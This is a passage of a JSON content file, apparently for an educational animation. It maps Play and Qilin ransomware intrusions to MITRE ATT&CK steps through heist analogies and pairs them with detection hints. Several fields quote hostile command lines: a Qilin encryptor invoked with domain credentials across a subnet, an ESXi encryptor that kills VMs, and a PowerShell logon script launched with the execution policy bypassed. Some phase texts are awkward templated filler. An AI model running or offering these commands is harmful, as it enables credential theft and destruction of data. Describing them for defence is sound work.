          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Driver Core",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Deploy Cart",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Medusa Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1072"
    }
  },
  "play-ransomware-grixba-vss-copy": {
    "briefing": {
      "scenarioId": "play-ransomware-grixba-vss-copy",
      "sectionKey": "briefing",
      "sceneKind": "ran-play-grixba-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1046",
      "title": "Play Ransomware Grixba Recon, AlphaVSS Shadow Copy Theft & Intermittent… — Story-to-Technical Overview",
      "storyCue": "Imagine a disciplined burglary crew that arrives in three quiet waves. First, they send a custom mechanical scout tucked inside a music closet to map every guard station and storage room; next, they use a custom instant-camera lens to photocopy bolted-down database ledgers without waking normal backup clerks; finally, they push a nimble lock-crew across every floor that snaps a padlock on alternating pages of every large filing cabinet so the whole building freezes at lightning speed.",
      "technicalCue": "CREDENTIAL ACCESS: Deploying Custom Grixba .NET Reconnaissance Scanner (inf_g.exe) -> EXFIL & IMPACT: AlphaVSS .NET Shadow Copy Mounting for Locked Database Exfiltration -> EXFIL & IMPACT: WinPE APIUnhooking & Intermittent 0x100000-Byte Chunk Encryption (.play)",
      "storyMappings": [
        {
          "storyTerm": "Custom mechanical scout tucked inside a music closet",
          "technicalTerm": "Grixba .NET reconnaissance scanner (C:\\Users\\Public\\Music\\inf_g.exe)",
          "tone": "amber"
        },
        {
          "storyTerm": "Custom instant-camera lens photocopying bolted ledgers",
          "technicalTerm": "AlphaVSS.x64.dll and AlphaFS.dll mounting Volume Shadow Copies directly via COM",
          "tone": "sky"
        },
        {
          "storyTerm": "Bypassing lobby camera tripwires before locking cabinets",
          "technicalTerm": "PEB dynamic API resolution and userland API unhooking inside Play encryptor",
          "tone": "rose"
        },
        {
          "storyTerm": "Padlocking alternating pages across every cabinet at lightning speed",
          "technicalTerm": "Intermittent 0x100000-byte stride encryption appending .play and 0xdeadbeef footer",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-play-grixba-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Custom mechanical scout tucked inside a…",
          "subtitle": "Grixba .NET reconnaissance scanner…",
          "tone": "amber"
        },
        {
          "id": "ran-play-grixba-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Custom instant-camera lens photocopying…",
          "subtitle": "AlphaVSS.x64.dll and AlphaFS.dll mounting Volume Shadow Copies…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Self-contained",
          "stageTag": "STAGE 01 · CREDENTIAL ACCESS",
          "title": "Deploying Custom Grixba .NET Reconnaissance Scanner (inf_g.exe)",
          "storyExcerpt": "Dropping a self-contained scouting robot into a public media folder, the crew maps every connected computer, active guard software, and backup server across the campus in a single clean sweep.",
          "technicalParallel": "Staging tools specifically inside C:\\Users\\Public\\Music\\ is a consistent operational tradecraft hallmark of Play ransomware intrusions.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Pair",
          "stageTag": "STAGE 02 · EXFIL & IMPACT",
          "title": "AlphaVSS .NET Shadow Copy Mounting for Locked Database Exfiltration",
          "storyExcerpt": "Because live corporate databases stay clamped shut while clerks are working, the crew slips a pair of specialized shadow-camera helper lenses into their own toolkit to lift clean copies of locked…",
          "technicalParallel": "Because vssadmin.exe, wmic.exe, and powershell.exe are never spawned during this step, detection rules that rely purely on process command-line strings completely miss both the ntds.dit theft and the…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Play Lock-crew",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "WinPE APIUnhooking & Intermittent 0x100000-Byte Chunk Encryption (.play)",
          "storyExcerpt": "Broadcast across every floor via the building master policy board, the Play lock-crew wipes off the security monitors inspection tape from its own tools and races through every filing cabinet locking…",
          "technicalParallel": "Encrypting only a few 1MB chunks per multi-gigabyte file reduces disk I/O by over 95%, allowing Play to corrupt terabytes of storage in minutes while keeping average file-entropy scores low enough to…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Scout Robot",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Bolted Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stride Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "play-ransomware-grixba-vss-copy",
      "sectionKey": "step-1",
      "sceneKind": "ran-play-grixba-step-1",
      "stageBadge": "STEP #1 · CREDENTIAL ACCESS",
      "title": "Deploying Custom Grixba .NET Reconnaissance Scanner (inf_g.exe)",
      "storyCue": "Dropping a self-contained scouting robot into a public media folder, the crew maps every connected computer, active guard software, and backup server across the campus in a single clean sweep.",
      "technicalCue": "T1046 · CREDENTIAL ACCESS — Play operators staged C:\\Users\\Public\\Music\\inf_g.exe (Grixba, a custom .NET reconnaissance tool compiled with Costura.Fody to embed its DLL dependencies inside a single executable and stamped…",
      "storyMappings": [
        {
          "storyTerm": "Self-contained scouting robot in a public media folder",
          "technicalTerm": "Unsigned .NET Costura-packed Grixba scanner staged at C:\\Users\\Public\\Music\\inf_g.exe",
          "tone": "amber"
        },
        {
          "storyTerm": "Full-sweep scouting orders",
          "technicalTerm": "Command-line flags -m:all or -m:s instructing full domain and AV enumeration",
          "tone": "sky"
        },
        {
          "storyTerm": "Mapped guard stations and backup vaults",
          "technicalTerm": "Exported CSV inventory of endpoints, AV products, and Veeam/backup servers",
          "tone": "rose"
        },
        {
          "storyTerm": "Bundled spare parts hidden inside one shell",
          "technicalTerm": "Costura.Fody embedded .NET assemblies loaded directly from memory",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-play-grixba-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Self-contained scouting robot in a…",
          "subtitle": "Unsigned .NET Costura-packed Grixba scanner staged at…",
          "tone": "amber"
        },
        {
          "id": "ran-play-grixba-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Full-sweep scouting orders",
          "subtitle": "Command-line flags -m:all or -m:s instructing full domain and…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Self-contained",
          "stageTag": "STEP 01 · SETUP",
          "title": "Self-contained scouting robot in a public media folder",
          "storyExcerpt": "Dropping a self-contained scouting robot into a public media folder, the crew maps every connected computer, active guard software, and backup server across the campus in a single clean sweep.",
          "technicalParallel": "Staging tools specifically inside C:\\Users\\Public\\Music\\ is a consistent operational tradecraft hallmark of Play ransomware intrusions.",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Full-sweep",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Full-sweep scouting orders",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses full-sweep scouting orders to advance toward mapped guard stations and backup vaults.",
          "technicalParallel": "Play operators staged C:\\Users\\Public\\Music\\inf_g.exe (Grixba, a custom .NET reconnaissance tool compiled with Costura.Fody to embed its DLL dependencies inside a single executable and stamped with a…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Self-contained",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Bundled spare parts hidden inside one shell",
          "storyExcerpt": "Behind the scenes, bundled spare parts hidden inside one shell captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Correlate Sysmon EventID 1 (Process Creation) and EventID 7 (Image Loaded tracking DLL assemblies) flagging unsigned .NET binaries executing from C:\\Users\\Public\\Music\\ that load embedded Costura…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Scout Robot",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Bolted Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stride Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1046"
    },
    "step-2": {
      "scenarioId": "play-ransomware-grixba-vss-copy",
      "sectionKey": "step-2",
      "sceneKind": "ran-play-grixba-step-2",
      "stageBadge": "STEP #2 · EXFIL & IMPACT",
      "title": "AlphaVSS .NET Shadow Copy Mounting for Locked Database Exfiltration",
      "storyCue": "Because live corporate databases stay clamped shut while clerks are working, the crew slips a pair of specialized shadow-camera helper lenses into their own toolkit to lift clean copies of locked password ledgers and accounting books without calling the noisy standard shadow-copy tool.",
      "technicalCue": "T1006 · EXFIL & IMPACT — To steal files locked exclusively by the OS (such as C:\\Windows\\NTDS\\ntds.dit or live SQL Server .mdf files) and subsequently wipe recovery snapshots without triggering command-line EDR rules…",
      "storyMappings": [
        {
          "storyTerm": "Pair of specialized shadow-camera helper lenses",
          "technicalTerm": "AlphaVSS.x64.dll (shadow copy COM wrapper) and AlphaFS.dll (long-path volume I/O)",
          "tone": "amber"
        },
        {
          "storyTerm": "Clamped-shut corporate ledgers",
          "technicalTerm": "Exclusively locked C:\\Windows\\NTDS\\ntds.dit and live SQL Server .mdf databases",
          "tone": "sky"
        },
        {
          "storyTerm": "Skipping the noisy standard shadow-copy tool",
          "technicalTerm": "Direct IVssBackupComponents COM invocation bypassing vssadmin.exe CLI alerts",
          "tone": "rose"
        },
        {
          "storyTerm": "Quiet extraction before extortion",
          "technicalTerm": "Staged database theft fueling Play double-extortion pressure",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-play-grixba-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Pair of specialized shadow-camera helper…",
          "subtitle": "AlphaVSS.x64.dll (shadow copy COM wrapper) and AlphaFS.dll…",
          "tone": "amber"
        },
        {
          "id": "ran-play-grixba-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Clamped-shut corporate ledgers",
          "subtitle": "Exclusively locked C:\\Windows\\NTDS\\ntds.dit and live SQL…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pair",
          "stageTag": "STEP 02 · SETUP",
          "title": "Pair of specialized shadow-camera helper lenses",
          "storyExcerpt": "Because live corporate databases stay clamped shut while clerks are working, the crew slips a pair of specialized shadow-camera helper lenses into their own toolkit to lift clean copies of…",
          "technicalParallel": "Because vssadmin.exe, wmic.exe, and powershell.exe are never spawned during this step, detection rules that rely purely on process command-line strings completely miss both the ntds.dit theft and the…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Tool",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Clamped-shut corporate ledgers",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses clamped-shut corporate ledgers to advance toward skipping the noisy standard shadow-copy tool.",
          "technicalParallel": "To steal files locked exclusively by the OS (such as C:\\Windows\\NTDS\\ntds.dit or live SQL Server .mdf files) and subsequently wipe recovery snapshots without triggering command-line EDR rules for…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tool",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Quiet extraction before extortion",
          "storyExcerpt": "Behind the scenes, quiet extraction before extortion captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Monitor Sysmon EventID 7 (Image Loaded recording every DLL mapped into memory) for AlphaVSS.x64.dll or AlphaFS.dll alongside Windows VSSEvent operational logs flagging non-backup binaries invoking…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Scout Robot",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Bolted Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stride Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1006"
    },
    "step-3": {
      "scenarioId": "play-ransomware-grixba-vss-copy",
      "sectionKey": "step-3",
      "sceneKind": "ran-play-grixba-step-3",
      "stageBadge": "STEP #3 · EXFIL & IMPACT",
      "title": "WinPE APIUnhooking & Intermittent 0x100000-Byte Chunk Encryption (.play)",
      "storyCue": "Broadcast across every floor via the building master policy board, the Play lock-crew wipes off the security monitors inspection tape from its own tools and races through every filing cabinet locking alternating one-megabyte blocks so massive archives become unusable in mere seconds.",
      "technicalCue": "T1486 · EXFIL & IMPACT — Pushed via Group Policy Objects (GPO), the Play ransomware binary dynamically resolved APIs via the Process Environment Block (PEB) to evade user-mode hooks, checked if target files already…",
      "storyMappings": [
        {
          "storyTerm": "Master policy board broadcasting across every floor",
          "technicalTerm": "Active Directory Group Policy Object (GPO) pushing Play ransomware domain-wide",
          "tone": "amber"
        },
        {
          "storyTerm": "Wiping security inspection tape off its own tools",
          "technicalTerm": "Dynamic PEB API resolution and userland EDR hook removal",
          "tone": "sky"
        },
        {
          "storyTerm": "Locking alternating one-megabyte blocks at high speed",
          "technicalTerm": "Intermittent 0x100000-byte stride encryption maximizing corruption velocity",
          "tone": "rose"
        },
        {
          "storyTerm": "Calling card stamped at the bottom of every file",
          "technicalTerm": ".play filename extension paired with an embedded 0xdeadbeef file footer marker",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-play-grixba-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Master policy board broadcasting across…",
          "subtitle": "Active Directory Group Policy Object (GPO) pushing Play…",
          "tone": "amber"
        },
        {
          "id": "ran-play-grixba-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Wiping security inspection tape off its…",
          "subtitle": "Dynamic PEB API resolution and userland EDR hook removal",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Play Lock-crew",
          "stageTag": "STEP 03 · SETUP",
          "title": "Master policy board broadcasting across every floor",
          "storyExcerpt": "Broadcast across every floor via the building master policy board, the Play lock-crew wipes off the security monitors inspection tape from its own tools and races through every filing cabinet…",
          "technicalParallel": "Encrypting only a few 1MB chunks per multi-gigabyte file reduces disk I/O by over 95%, allowing Play to corrupt terabytes of storage in minutes while keeping average file-entropy scores low enough to…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Tape Off",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Wiping security inspection tape off its own tools",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses wiping security inspection tape off its own tools to advance toward locking alternating one-megabyte blocks at high speed.",
          "technicalParallel": "Pushed via Group Policy Objects (GPO), the Play ransomware binary dynamically resolved APIs via the Process Environment Block (PEB) to evade user-mode hooks, checked if target files already contained the…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. One-megabyte",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Calling card stamped at the bottom of every file",
          "storyExcerpt": "Behind the scenes, calling card stamped at the bottom of every file captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Deploy filesystem minifilter behavioral monitors (kernel-level disk I/O sensors that inspect write patterns in real time) to detect rapid 0x100000-byte stride partial file overwrites.play extension…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Scout Robot",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Bolted Vault",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Stride Lock",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1486"
    }
  },
  "qilin-agenda-rust-chrome-cred-harvester-esxi": {
    "briefing": {
      "scenarioId": "qilin-agenda-rust-chrome-cred-harvester-esxi",
      "sectionKey": "briefing",
      "sceneKind": "ran-qilin-esxi-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1555.003",
      "title": "Qilin (Agenda) Ransomware: GPO PowerShell Chrome Credential Harvester… — Story-to-Technical Overview",
      "storyCue": "Imagine a clever heist crew that compromises a corporate headquarters and quietly pins a tiny extra morning-checkin chore onto the official employee welcome board so every worker who sits down at their desk unknowingly hands over every password saved inside their web browser. Armed with that giant ring of stolen keys, the crew unlocks every shared office vault and basement virtual server simultaneously and seals both estates in one synchronized sweep.",
      "technicalCue": "CREDENTIAL ACCESS: Active Directory GPO Logon Script Harvesting Chrome/Edge DPAPI Credentials -> LATERAL & C2: Credential-Authenticated Share Mounting (`-d`), Service Termination & VSS Wipe -> EXFIL & IMPACT: Simultaneous Windows & ESXi Hypervisor ChaCha20 / AES-256-GCM Encryption (`.qilin`)",
      "storyMappings": [
        {
          "storyTerm": "Pinning a tiny morning-checkin chore onto the welcome board",
          "technicalTerm": "Active Directory GPO PowerShell logon script harvesting Chrome and Edge DPAPI credentials",
          "tone": "amber"
        },
        {
          "storyTerm": "Unlocking shared vaults with the stolen key ring before shredding backups",
          "technicalTerm": "Rust Qilin binary invoked with -d credentials mounting shares, killing services, and wiping VSS",
          "tone": "sky"
        },
        {
          "storyTerm": "Sealing both office desktops and basement virtual servers at once",
          "technicalTerm": "Simultaneous Windows and ESXi ChaCha20 or AES-256-GCM encryption",
          "tone": "rose"
        },
        {
          "storyTerm": "Tailored affiliate locking profile",
          "technicalTerm": "Configurable per-affiliate cipher mode wrapped with RSA public key",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#FACC15",
      "durationSec": 18,
      "callouts": [
        {
          "id": "ran-qilin-esxi-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Pinning a tiny morning-checkin chore…",
          "subtitle": "Active Directory GPO PowerShell logon script harvesting Chrome…",
          "tone": "amber"
        },
        {
          "id": "ran-qilin-esxi-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Unlocking shared vaults with the stolen…",
          "subtitle": "Rust Qilin binary invoked with -d credentials mounting shares…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Tiny Onto",
          "stageTag": "STAGE 01 · CREDENTIAL ACCESS",
          "title": "Active Directory GPO Logon Script Harvesting Chrome/Edge DPAPI Credentials",
          "storyExcerpt": "After seizing the headquarters policy board, the crew attaches a covert morning login script that waits patiently for employees to sign in across the company, silently scooping up every saved web…",
          "technicalParallel": "Under the hood, the observed step executes GPO Logon Script: powershell.exe -ExecutionPolicy Bypass -File \\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.ps1 (which invokes the Windows PowerShell host…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Keys",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "Credential-Authenticated Share Mounting (`-d`), Service Termination & VSS Wipe",
          "storyExcerpt": "Feeding the freshly harvested master keys directly into their Rust-forged utility, the crew automatically unlocks remote shared cabinets, shuts down noisy database clerks holding files open, and shreds…",
          "technicalParallel": "Under the hood, the observed step executes qilin_rust.exe -d \"CORP\\svc_backup:P@ssw0rd2026!\" -p \"\\\\10.10.0.0/16\" (which executes the technical command / telemetry directive , qilin_rust.exe -d…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Per Job",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "Simultaneous Windows & ESXi Hypervisor ChaCha20 / AES-256-GCM Encryption (`.qilin`)",
          "storyExcerpt": "Switching seamlessly between high-speed locking gears tailored for each affiliate job, the crew seals both office desktop files and basement virtual server hosts at the exact same time, leaving the…",
          "technicalParallel": "Under the hood, the observed step executes ./qilin_esxi --path /vmfs/volumes --kill-vms (Terminates ESXi VMX worlds & encrypts .vmdk/.vmx) (which executes the technical command / telemetry directive…",
          "accentHex": "#FACC15",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Board",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Ring",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "qilin-agenda-rust-chrome-cred-harvester-esxi",
      "sectionKey": "step-1",
      "sceneKind": "ran-qilin-esxi-step-1",
      "stageBadge": "STEP #1 · CREDENTIAL ACCESS",
      "title": "Active Directory GPO Logon Script Harvesting Chrome/Edge DPAPI Credentials",
      "storyCue": "After seizing the headquarters policy board, the crew attaches a covert morning login script that waits patiently for employees to sign in across the company, silently scooping up every saved web password and cookie out of their browser vaults.",
      "technicalCue": "T1555.003 · CREDENTIAL ACCESS — After compromising a Domain Controller, Qilin affiliates create a Group Policy Object linking a PowerShell logon script (\\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.ps1).",
      "storyMappings": [
        {
          "storyTerm": "Headquarters policy board",
          "technicalTerm": "Compromised Active Directory Domain Controller Group Policy Object (GPO)",
          "tone": "amber"
        },
        {
          "storyTerm": "Covert morning login script waiting for employees",
          "technicalTerm": "GPO PowerShell logon script running inside each authenticated user context",
          "tone": "sky"
        },
        {
          "storyTerm": "Scooping up saved web passwords from browser vaults",
          "technicalTerm": "DPAPI decryption of Chrome and Edge Login Data across hundreds of user sessions",
          "tone": "rose"
        },
        {
          "storyTerm": "Staged credential harvest for lateral expansion",
          "technicalTerm": "Centralized collection of VPN, SaaS, vCenter, and administrative passwords",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-qilin-esxi-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Headquarters policy board",
          "subtitle": "Compromised Active Directory Domain Controller Group Policy…",
          "tone": "amber"
        },
        {
          "id": "ran-qilin-esxi-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Covert morning login script waiting for…",
          "subtitle": "GPO PowerShell logon script running inside each authenticated…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Crew Sign",
          "stageTag": "STEP 01 · SETUP",
          "title": "Headquarters policy board",
          "storyExcerpt": "After seizing the headquarters policy board, the crew attaches a covert morning login script that waits patiently for employees to sign in across the company, silently scooping up every saved…",
          "technicalParallel": "Under the hood, the observed step executes GPO Logon Script: powershell.exe -ExecutionPolicy Bypass -File \\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.ps1 (which invokes the Windows PowerShell host…",
          "accentHex": "#F43F5E",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Up",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Covert morning login script waiting for employees",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses covert morning login script waiting for employees to advance toward scooping up saved web passwords from browser vaults.",
          "technicalParallel": "After compromising a Domain Controller, Qilin affiliates create a Group Policy Object linking a PowerShell logon script (\\\\corp.local\\SYSVOL\\corp.local\\scripts\\logon.ps1).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Up Web",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Staged credential harvest for lateral expansion",
          "storyExcerpt": "Behind the scenes, staged credential harvest for lateral expansion captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in PowerShell Event 4104 (recording Technique=GPO-Driven Mass Browser Credential Harvesting , Sophos X-Ops, TargetArtifacts=Chrome/Edge Login Data SQLite + Local State DPAPI Key…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Policy Board",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Server Vault",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Key Ring",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1555.003"
    },
    "step-2": {
      "scenarioId": "qilin-agenda-rust-chrome-cred-harvester-esxi",
      "sectionKey": "step-2",
      "sceneKind": "ran-qilin-esxi-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "Credential-Authenticated Share Mounting (-d), Service Termination & VSS Wipe",
      "storyCue": "Feeding the freshly harvested master keys directly into their Rust-forged utility, the crew automatically unlocks remote shared cabinets, shuts down noisy database clerks holding files open, and shreds every local backup copy.",
      "technicalCue": "T1021.002 · LATERAL & C2 — Using the harvested domain and vCenter/ESXi credentials, the operator invokes the Rust-compiled Qilin binary with -d DOMAIN\\Admin:Password (which calls WNetAddConnection2W to automatically…",
      "storyMappings": [
        {
          "storyTerm": "Feeding freshly harvested master keys into the utility",
          "technicalTerm": "Rust Qilin encryptor invoked with -d domain and credential arguments",
          "tone": "amber"
        },
        {
          "storyTerm": "Automatically unlocking remote shared cabinets",
          "technicalTerm": "Authenticated SMB share mounting across discovered network servers",
          "tone": "sky"
        },
        {
          "storyTerm": "Shutting down database clerks holding files open",
          "technicalTerm": "Automated termination of SQL, mail, and backup Windows services",
          "tone": "rose"
        },
        {
          "storyTerm": "Shredding every local backup copy",
          "technicalTerm": "Volume Shadow Copy wipe eliminating local restore points",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 15,
      "callouts": [
        {
          "id": "ran-qilin-esxi-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Feeding freshly harvested master keys…",
          "subtitle": "Rust Qilin encryptor invoked with -d domain and credential…",
          "tone": "amber"
        },
        {
          "id": "ran-qilin-esxi-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Automatically unlocking remote shared…",
          "subtitle": "Authenticated SMB share mounting across discovered network…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Keys",
          "stageTag": "STEP 02 · SETUP",
          "title": "Feeding freshly harvested master keys into the utility",
          "storyExcerpt": "Feeding the freshly harvested master keys directly into their Rust-forged utility, the crew automatically unlocks remote shared cabinets, shuts down noisy database clerks holding files open…",
